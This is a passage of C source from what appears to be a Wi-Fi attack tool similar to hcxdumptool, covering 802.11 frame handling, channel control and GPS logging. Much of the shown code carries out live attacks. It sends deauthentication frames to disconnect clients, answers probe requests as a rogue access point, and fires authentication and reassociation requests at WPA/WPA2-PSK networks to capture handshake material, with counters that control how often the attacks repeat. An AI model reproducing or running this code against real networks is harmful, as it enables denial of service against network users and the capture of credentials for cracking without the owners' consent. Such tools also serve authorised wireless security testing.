	if(memcmp(macfrx->addr1, macfrx->addr3, 6) == 0) send_authentication_sae_commit(macfrx->addr2, macfrx->addr1);
	else if(memcmp(macfrx->addr2, macfrx->addr3, 6) == 0) send_authentication_sae_confirm(macfrx->addr2, macfrx->addr1);
	}
if(ntohs(auth->sequence) == 2)
	{
	if(memcmp(macfrx->addr1, macfrx->addr3, 6) == 0) send_authentication_sae_confirm(macfrx->addr2 ,macfrx->addr1);
	}
return;
}
/*===========================================================================*/
static inline void process80211authentication_resp()
{
static authf_t *auth;
static macessidlist_t *zeiger;

auth = (authf_t*)payloadptr;
if(payloadlen < AUTHENTICATIONFRAME_SIZE) return;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if((zeiger->essidlen != 0) && (zeiger->essid[0] != 0) && (auth->algorithm == OPEN_SYSTEM) && (memcmp(&mac_myclient, macfrx->addr1, 6) == 0))
		{
		if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_association_req_wpa2(zeiger);
		else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_association_req_wpa1(zeiger);
		}
	if((zeiger->status &AP_AUTH_RESP) != AP_AUTH_RESP)
		{
		zeiger->status |= AP_AUTH_RESP;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
		}
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = AP_AUTH_RESP;
memcpy(zeiger->ap, macfrx->addr2, 6);
if(filtermode != 0)
	{
	if(setapfilter(zeiger) == true)
		{
		qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
		return;
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211authentication_req()
{
static authf_t *auth;
static ownlist_t *zeiger;

auth = (authf_t*)payloadptr;
if(payloadlen < AUTHENTICATIONFRAME_SIZE) return;
for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if(memcmp(zeiger->client, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if(((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) && ((zeiger->status < OW_M1M2ROGUE) || ((eapreqflag == true) && (zeiger->eapctx.reqstate < eapreqentries))))
		{
		if(auth->algorithm == OPEN_SYSTEM) send_authentication_resp_opensystem();
		}
	if((zeiger->status &OW_AUTH) != OW_AUTH)
		{
		zeiger->status |= OW_AUTH;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if((statusout &STATUS_AUTHENTICATION) == STATUS_AUTHENTICATION) printown(zeiger, "AUTHENTICATION");
		}
	return;
	}
memset(zeiger, 0, OWNLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = OW_AUTH;
memcpy(zeiger->ap, macfrx->addr1, 6);
memcpy(zeiger->client, macfrx->addr2, 6);
if(filtermode != 0)
	{
	if(setclientfilter(zeiger) == true)
		{
		qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
		return;
		}
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	if(auth->algorithm == OPEN_SYSTEM) send_authentication_resp_opensystem();
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_AUTHENTICATION) == STATUS_AUTHENTICATION) printown(zeiger, "AUTHENTICATION");
qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211probe_req_directed()
{
static macessidlist_t *zeiger;
static tags_t tags;

if(memcmp(&mac_myapopen, macfrx->addr1, 6) == 0)
	{
	if((attackstatus &SILENT) != SILENT) send_probe_resp_open();
	}
if(payloadlen < IETAG_SIZE) return;
gettags(payloadlen, payloadptr, &tags);
if((tags.essidlen == 0) || (tags.essid[0] == 0)) return;
for(zeiger = rglist; zeiger < rglist +RGLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if(zeiger->essidlen != tags.essidlen) continue;
	if(memcmp(zeiger->essid, tags.essid, tags.essidlen) != 0) continue;
	zeiger->timestamp = timestamp;
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_probe_resp(macfrx->addr2, zeiger);
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
zeiger->timestamp = timestamp;
memcpy(zeiger->ap, macfrx->addr1, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	send_probe_resp(macfrx->addr2, zeiger);
	if((statusout &STATUS_ROGUE) == STATUS_ROGUE) printstatusap(macfrx->addr2, zeiger, "ROGUE PROBERESPONSE");
	}
memcpy(&mac_myprclient, macfrx->addr2, 6);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
qsort(rglist, zeiger -rglist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211probe_req()
{
static macessidlist_t *zeiger;
static tags_t tags;

if(payloadlen < IETAG_SIZE) return;
gettags(payloadlen, payloadptr, &tags);
if((tags.essidlen == 0) || (tags.essid[0] == 0)) return;
for(zeiger = rglist; zeiger < rglist +RGLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(zeiger->essidlen != tags.essidlen) continue;
	if(memcmp(zeiger->essid, tags.essid, tags.essidlen) != 0) continue;
	zeiger->timestamp = timestamp;
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_probe_resp(macfrx->addr2, zeiger);
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
zeiger->timestamp = timestamp;
memcpy(zeiger->ap, &mac_myap, 3);
zeiger->ap[3] = (mynic_ap >> 16) & 0xff;
zeiger->ap[4] = (mynic_ap >> 8) & 0xff;
zeiger->ap[5] = mynic_ap & 0xff;
mynic_ap++;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	send_probe_resp(macfrx->addr2, zeiger);
	if((statusout &STATUS_ROGUE) == STATUS_ROGUE) printstatusap(macfrx->addr2, zeiger, "ROGUE PROBERESPONSE");
	}
memcpy(&mac_myprclient, macfrx->addr2, 6);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
qsort(rglist, zeiger -rglist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211probe_resp()
{
static int apinfolen;
static uint8_t *apinfoptr;
static macessidlist_t *zeiger;
static tags_t tags;

if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if((zeiger->essidlen == 0) || (zeiger->essid[0] == 0))
		{
		gettags(apinfolen, apinfoptr, &tags);
		if((tags.essidlen == 0) || (tags.essid[0] == 0)) return;
		zeiger->timestamp = timestamp;
		memcpy(zeiger->ap, macfrx->addr2, 6);
		if(tags.channel != 0) zeiger->channel = tags.channel;
		else zeiger->channel = ptrfscanlist->channel;
		zeiger->kdversion = tags.kdversion;
		zeiger->groupcipher = tags.groupcipher;
		zeiger->cipher = tags.cipher;
		zeiger->akm = tags.akm;
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		}
	if((zeiger->status &AP_PROBE_RESP) != AP_PROBE_RESP)
		{
		zeiger->status |= AP_PROBE_RESP;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
		if((statusout &STATUS_AP_BEACON_PROBE) == STATUS_AP_BEACON_PROBE) printstatusap(macfrx->addr1, zeiger, "PROBERESPONSE");
		}
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
gettags(apinfolen, apinfoptr, &tags);
zeiger->timestamp = timestamp;
zeiger->status = AP_PROBE_RESP;
memcpy(zeiger->ap, macfrx->addr2, 6);
if(tags.channel != 0) zeiger->channel = tags.channel;
else zeiger->channel = ptrfscanlist->channel;
zeiger->kdversion = tags.kdversion;
zeiger->groupcipher = tags.groupcipher;
zeiger->cipher = tags.cipher;
zeiger->akm = tags.akm;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(filtermode != 0)
	{
	if(setapfilter(zeiger) == true)
		{
		qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
		return;
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
if((statusout &STATUS_AP_BEACON_PROBE) == STATUS_AP_BEACON_PROBE) printstatusap(macfrx->addr1, zeiger, "PROBERESPONSE");
qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void processpagid(uint8_t *pagidptr)
{
static pagidlist_t *zeiger;
static char timestring[16];

for(zeiger = pagidlist; zeiger < pagidlist +PAGIDLIST_MAX -1; zeiger++)
	{
	if(zeiger->id[0] == 0) break;
	if(memcmp(zeiger->id, pagidptr, 64) == 0) return;
	}
zeiger->timestamp = timestamp;
memcpy(zeiger->id, pagidptr, 64);
if(((statusout &STATUS_AP_BEACON_PROBE) == STATUS_AP_BEACON_PROBE) || ((statusout &STATUS_ROGUE) == STATUS_ROGUE) || ((statusout &STATUS_ASSOCIATION) == STATUS_ASSOCIATION))
	{
	strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
	if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d                            %02x%02x%02x%02x%02x%02x [PWNAGOTCHI ID:%.*s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
							macfrx->addr2[0], macfrx->addr2[1], macfrx->addr2[2], macfrx->addr2[3], macfrx->addr2[4], macfrx->addr2[5], 64, zeiger->id);
	else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d                             %02x%02x%02x%02x%02x%02x [PWNAGOTCHI ID:%.*s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
							macfrx->addr2[0], macfrx->addr2[1], macfrx->addr2[2], macfrx->addr2[3], macfrx->addr2[4], macfrx->addr2[5], 64, zeiger->id);
	else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d                              %02x%02x%02x%02x%02x%02x [PWNAGOTCHI ID:%.*s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
			macfrx->addr2[0], macfrx->addr2[1], macfrx->addr2[2], macfrx->addr2[3], macfrx->addr2[4], macfrx->addr2[5], 64, zeiger->id);
	if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
	else printf("%s", servermsg);
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
qsort(pagidlist, PAGIDLIST_MAX, PAGIDLIST_SIZE, sort_pagidlist_by_time);
return;
}
/*===========================================================================*/
static inline bool processpag(int vendorlen, uint8_t *ieptr)
{
static int c, p;
static const uint8_t mac_pwag[6] =
{
0xde, 0xad, 0xbe, 0xef, 0xde, 0xad
};

if(ieptr[1] != 0xff) return false;
if(vendorlen <= 0x78) return false;
if(memcmp(&mac_pwag, macfrx->addr2, 6) != 0) return false;
for(p = 2; p < vendorlen -75 ; p++)
	{
	if(memcmp(&ieptr[p], "identity", 8) == 0)
		{
		for(c = 0; c < 64; c++)
			{
			if(!isxdigit(ieptr[p +11 +c])) return false;
			}
		processpagid(ieptr +p +11);
		return true;
		}
	}
return false;
}
/*===========================================================================*/
static inline void process80211beacon()
{
static int apinfolen;
static uint8_t *apinfoptr;
static macessidlist_t *zeiger;
static tags_t tags;

if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
if(apinfoptr[0] == TAG_PAG)
	{
	if(processpag(apinfolen, apinfoptr) == true) return;
	}
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count +=1;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if((zeiger->count %600) == 0)
		{
		gettags(apinfolen, apinfoptr, &tags);
		if((tags.essidlen == 0) || (tags.essid[0] == 0))
			{
			if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
			return;
			}
		zeiger->timestamp = timestamp;
		memcpy(zeiger->ap, macfrx->addr2, 6);
		if(tags.channel != 0) zeiger->channel = tags.channel;
		else zeiger->channel = ptrfscanlist->channel;
		zeiger->kdversion = tags.kdversion;
		zeiger->groupcipher = tags.groupcipher;
		zeiger->cipher = tags.cipher;
		zeiger->akm = tags.akm;
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		}
	if((infinityflag == true) && ((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS))
		{
		if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256))
			{
			if(((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) || ((zeiger->kdversion &KV_WPAIE) == KV_WPAIE)) send_authentication_req_opensystem(macfrx->addr2);
			}
		if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(zeiger);
		else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(zeiger);
		if(memcmp(&mac_null, zeiger->client, 6) != 0) send_deauthentication2client(zeiger->client, zeiger->ap, reasoncode);
		send_deauthentication2client(macfrx->addr1, macfrx->addr2, reasoncode);
		}
	if((ptrfscanlist->channel == zeiger->channel) && (zeiger->status < AP_M2M3) && (zeiger->count <= attackstopcount))
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
			{
			if((zeiger->count %attackcount) == staytime)
				{
				if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256))
					{
					if(((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) || ((zeiger->kdversion &KV_WPAIE) == KV_WPAIE)) send_authentication_req_opensystem(macfrx->addr2);
					}
				}
			if(((zeiger->count %attackcount) == staytime *2) && (memcmp(&mac_null, zeiger->client, 6) != 0))
				{
				if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(zeiger);
				else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(zeiger);
				}
			}
		if((attackstatus &DISABLE_DEAUTHENTICATION) != DISABLE_DEAUTHENTICATION)
			{
			if(((zeiger->count %attackcount) == staytime *3) && (memcmp(&mac_null, zeiger->client, 6) != 0))
				{
				send_deauthentication2client(zeiger->client, zeiger->ap, reasoncode);
				}
			if((zeiger->count %attackcount) == staytime *4)
				{
				send_deauthentication2client(macfrx->addr1, macfrx->addr2, reasoncode);
				}
			}
		}
	if(zeiger->count >= attackresumecount) zeiger->count = 0;
	if((zeiger->status &AP_BEACON) != AP_BEACON)
		{
		zeiger->status |= AP_BEACON;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
		if((statusout &STATUS_AP_BEACON_PROBE) == STATUS_AP_BEACON_PROBE) printstatusap(macfrx->addr1, zeiger, "BEACON");
		}
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
gettags(apinfolen, apinfoptr, &tags);
zeiger->timestamp = timestamp;
zeiger->status = AP_BEACON;
memcpy(zeiger->ap, macfrx->addr2, 6);
if(tags.channel != 0) zeiger->channel = tags.channel;
else zeiger->channel = ptrfscanlist->channel;
zeiger->kdversion = tags.kdversion;
zeiger->groupcipher = tags.groupcipher;
zeiger->cipher = tags.cipher;
zeiger->akm = tags.akm;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(filtermode != 0)
	{
	if(setapfilter(zeiger) == true)
		{
		qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
		return;
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
if(ptrfscanlist->channel == zeiger->channel)
	{
	if((tags.essidlen != 0) && (tags.essid[0] != 0))
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
			{
			if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256))
				{
				if(((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) || ((zeiger->kdversion &KV_WPAIE) == KV_WPAIE)) send_authentication_req_opensystem(macfrx->addr2);
				}
			if((attackstatus &DISABLE_DEAUTHENTICATION) != DISABLE_DEAUTHENTICATION) send_deauthentication2client(macfrx->addr1, macfrx->addr2, reasoncode);
			}
		}
	else
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		}
	}
if((statusout &STATUS_AP_BEACON_PROBE) == STATUS_AP_BEACON_PROBE) printstatusap(macfrx->addr1, zeiger, "BEACON");
qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void get_channel_no_cm()
{
static struct iwreq pwrq;

ptrfscanlist = fscanlist;
memset(&pwrq, 0, sizeof(pwrq));
memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) == 0)
	{
	if(pwrq.u.freq.e == 6) ptrfscanlist->frequency = pwrq.u.freq.m;
	else if(pwrq.u.freq.e == 5) ptrfscanlist->frequency = pwrq.u.freq.m /10;
	else if(pwrq.u.freq.e == 4) ptrfscanlist->frequency = pwrq.u.freq.m /100;
	else if(pwrq.u.freq.e == 3) ptrfscanlist->frequency = pwrq.u.freq.m /1000;
	else if(pwrq.u.freq.e == 2) ptrfscanlist->frequency = pwrq.u.freq.m /10000;
	else if(pwrq.u.freq.e == 1) ptrfscanlist->frequency = pwrq.u.freq.m /100000;
	else if(pwrq.u.freq.e == 0) ptrfscanlist->frequency = pwrq.u.freq.m /1000000;
	else return;
	if((ptrfscanlist->frequency >= 2412) && (ptrfscanlist->frequency <= 2472)) ptrfscanlist->channel = (ptrfscanlist->frequency -2407)/5;
	else if(ptrfscanlist->frequency == 2484) ptrfscanlist->channel = (ptrfscanlist->frequency -2412)/5;
	else if((ptrfscanlist->frequency >= 5180) && (ptrfscanlist->frequency <= 5905)) ptrfscanlist->channel = (ptrfscanlist->frequency -5000)/5;
	else if((ptrfscanlist->frequency >= 5955) && (ptrfscanlist->frequency <= 7115)) ptrfscanlist->channel = (ptrfscanlist->frequency -5950)/5;
	return;
	}
ptrfscanlist->frequency = 0;
ptrfscanlist->channel = 0;
return;
}
/*===========================================================================*/
static inline void get_channel()
{
static struct iwreq pwrq;
static char timestring[16];

memset(&pwrq, 0, sizeof(pwrq));
memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
pwrq.u.freq.flags = IW_FREQ_FIXED;
if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) return;
if((pwrq.u.freq.e == 6) && (aktchannel = pwrq.u.freq.m)) return;
else if((pwrq.u.freq.e == 5) && (aktchannel == pwrq.u.freq.m /10)) return;
else if((pwrq.u.freq.e == 4) && (aktchannel == pwrq.u.freq.m /100)) return;
else if((pwrq.u.freq.e == 3) && (aktchannel == pwrq.u.freq.m /1000)) return;
else if((pwrq.u.freq.e == 2) && (aktchannel == pwrq.u.freq.m /10000)) return;
else if((pwrq.u.freq.e == 1) && (aktchannel == pwrq.u.freq.m /100000)) return;
else if((pwrq.u.freq.e == 0) && (aktchannel == pwrq.u.freq.m /1000000)) return;

errorcount++;
strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
snprintf(servermsg, SERVERMSG_MAX, "%s     ERROR: %d [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: %d, DETECTED: %d]\n", timestring, errorcount, aktchannel, pwrq.u.freq.m);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
else fprintf(stdout, "%s", servermsg);
return;
}
/*===========================================================================*/
static inline bool set_channel()
{
static struct iwreq pwrq;

memset(&pwrq, 0, sizeof(pwrq));
memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.m = ptrfscanlist->frequency;
if(ptrfscanlist->frequency > 1000) pwrq.u.freq.e = 6;
if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) return false;
if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) return false;
if(pwrq.u.freq.e == 6) aktchannel = pwrq.u.freq.m;
else if(pwrq.u.freq.e == 5) aktchannel = pwrq.u.freq.m /10;
else if(pwrq.u.freq.e == 4) aktchannel = pwrq.u.freq.m /100;
else if(pwrq.u.freq.e == 3) aktchannel = pwrq.u.freq.m /1000;
else if(pwrq.u.freq.e == 2) aktchannel = pwrq.u.freq.m /10000;
else if(pwrq.u.freq.e == 1) aktchannel = pwrq.u.freq.m /100000;
else if(pwrq.u.freq.e == 0) aktchannel = pwrq.u.freq.m /1000000;
else return false;
if(aktchannel < 3000)
	{
	hdradiotap[9] = 0x02;
	hdradiotap_ack[9] = 0x02;
	return true;
	}
hdradiotap[9] = 0x0c;
hdradiotap_ack[9] = 0x0c;
return true;
}
/*===========================================================================*/
static inline bool set_channel_test(int freq)
{
static int freqreported;
static struct iwreq pwrq;

memset(&pwrq, 0, sizeof(pwrq));
memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.m = freq;
if(freq > 1000) pwrq.u.freq.e = 6;
if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0)
	{
	fprintf(stderr, "driver doesn't support ioctl() SIOCSIWFREQ\n");
	return false;
	}
memset(&pwrq, 0, sizeof(pwrq));
memcpy(&pwrq.ifr_name, interfacename, IFNAMSIZ);
if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0)
	{
	fprintf(stderr, "driver doesn't support ioctl() SIOCGIWFREQ\n");
	return false;
	}
if(pwrq.u.freq.m > 1000)
	{
	if(pwrq.u.freq.e == 6) freqreported = pwrq.u.freq.m;
	else if(pwrq.u.freq.e == 5) freqreported = pwrq.u.freq.m /10;
	else if(pwrq.u.freq.e == 4) freqreported = pwrq.u.freq.m /100;
	else if(pwrq.u.freq.e == 3) freqreported = pwrq.u.freq.m /1000;
	else if(pwrq.u.freq.e == 2) freqreported = pwrq.u.freq.m /10000;
	else if(pwrq.u.freq.e == 1) freqreported = pwrq.u.freq.m /100000;
	else if(pwrq.u.freq.e == 0) freqreported = pwrq.u.freq.m /1000000;
	else
		{
		fprintf(stderr, "unhandled expontent %d reported by driver\n", pwrq.u.freq.e);
		return false;
		}
	if(freqreported == freq) return true;
	}
fprintf(stderr, "driver doesn't report frequency\n");
return false;
}
/*===========================================================================*/
static inline void process_gps()
{
static char *nmeaptr;
static const char *gpgga = "$GPGGA";
static const char *gprmc = "$GPRMC";

nmeatemplen = read(fd_gps, nmeatempsentence, NMEA_MAX -1);
if(nmeatemplen < 0)
	{
	perror("\nfailed to read NMEA sentence");
	gpserrorcount++;
	errorcount++;
	return;
	}
nmeatempsentence[nmeatemplen] = 0;
if(nmeatemplen < 48) return;
nmeaptr = strstr(nmeatempsentence, gpgga);
if(nmeaptr == NULL) nmeaptr = strstr(nmeatempsentence, gprmc);
if(nmeaptr == NULL) return;
nmealen = 0;
while((nmeaptr[nmealen] != 0x0) && (nmeaptr[nmealen] != 0x0a) && (nmeaptr[nmealen] != 0xd)) nmealen++;
nmeaptr[nmealen] = 0;
memcpy(&nmeasentence, nmeaptr, nmealen +1);
if(fd_pcapng > 0) writecbnmea(fd_pcapng);
if(fh_nmea != NULL) fprintf(fh_nmea, "%s\n", nmeasentence);
gpscount++;
return;
}
/*===========================================================================*/
/*===========================================================================*/
static void sendpcapngheader()
{
static const uint8_t servermsgtype = SERVERMSG_TYPE_PCAPNGHEAD;
sendto(fd_socket_mcsrv, &servermsgtype, sizeof(servermsgtype), MSG_MORE, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
hcxcreatepcapngdumpfdsocket(fd_socket_mcsrv, (struct sockaddr*)&mcsrvaddress, mac_orig, interfacename, mac_myap, myrc, myanonce, mac_myclient, mysnonce, weakcandidatelen, weakcandidate);
return;
}
/*===========================================================================*/
static void process_packet_client()
{
static ssize_t serverrecvlen;
static uint8_t serverrecvbuf[SERVERMSG_MAX];
static struct sockaddr_in sockaddrFrom;
static socklen_t sockaddrFrom_len = sizeof(sockaddrFrom);

serverrecvlen = recvfrom(fd_socket_srv, &serverrecvbuf, SERVERMSG_MAX, 0, (struct sockaddr*)&sockaddrFrom, &sockaddrFrom_len);
if((serverrecvlen >= 2) && (sockaddrFrom.sin_port == mcsrvaddress.sin_port))
	{
	if(serverrecvbuf[0] == SERVERMSG_TYPE_CONTROL)
		{
		switch(serverrecvbuf[1])
			{
			case SERVERMSG_CONTROL_SENDPCAPNGHEAD:
				if((pcapngoutname != NULL) && (fd_pcapng == fd_socket_mcsrv))
					sendpcapngheader();
				break;
			}
		}
	}
}
/*===========================================================================*/
static uint32_t getradiotapfield(uint16_t rthlen, uint32_t rthp)
{
static int i;
static uint16_t pf;
static uint16_t pfc;
static uint32_t *pp;

pf = RTH_SIZE;
rssi = 0;
if((rthp & IEEE80211_RADIOTAP_EXT) == IEEE80211_RADIOTAP_EXT)
	{
	pp = (uint32_t*)packetptr;
	for(i = 2; i < rthlen /4; i++)
		{
		pf += 4;
		if((le32toh(pp[i]) & IEEE80211_RADIOTAP_EXT) != IEEE80211_RADIOTAP_EXT) break;
		}
	}
if((rthp & IEEE80211_RADIOTAP_TSFT) == IEEE80211_RADIOTAP_TSFT)
	{
	if((pf %8) != 0) pf += 4;
	pf += 8;
	}
pfc = 0;
if((rthp & IEEE80211_RADIOTAP_FLAGS) == IEEE80211_RADIOTAP_FLAGS)
	{
	if((packetptr[pf] & IEEE80211_RADIOTAP_F_FCS) == IEEE80211_RADIOTAP_F_FCS) pfc = 4;
	pf +=1;
	}
if((rthp & IEEE80211_RADIOTAP_RATE) == IEEE80211_RADIOTAP_RATE) pf += 1;
if((rthp & IEEE80211_RADIOTAP_CHANNEL) == IEEE80211_RADIOTAP_CHANNEL)
	{
	if((pf %2) != 0) pf += 1;
	pf += 4;
	}
